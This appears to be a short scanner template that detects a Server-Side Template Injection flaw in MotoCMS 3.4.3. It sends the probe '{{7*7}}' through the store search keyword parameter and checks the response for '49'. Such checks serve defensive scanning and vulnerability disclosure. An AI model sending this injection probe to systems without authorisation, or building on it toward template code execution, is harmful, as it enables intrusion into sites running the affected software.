info:
  author: hexa
  description: 'MotoCMS Version 3.4.3 Store Category Template was discovered to contain
    a Server-Side Template Injection (SSTI) vulnerability via the keyword parameter.

    '
  name: MotoCMS Version 3.4.3 - Server-Side Template Injection (SSTI)
  severity: high
requests:
- matchers:
  - part: body
    type: word
    words:
    - '49'
  method: GET
  path:
  - '{{BaseURL}}/store/category/search/?page=1&limit=36&keyword={{7*7}}'
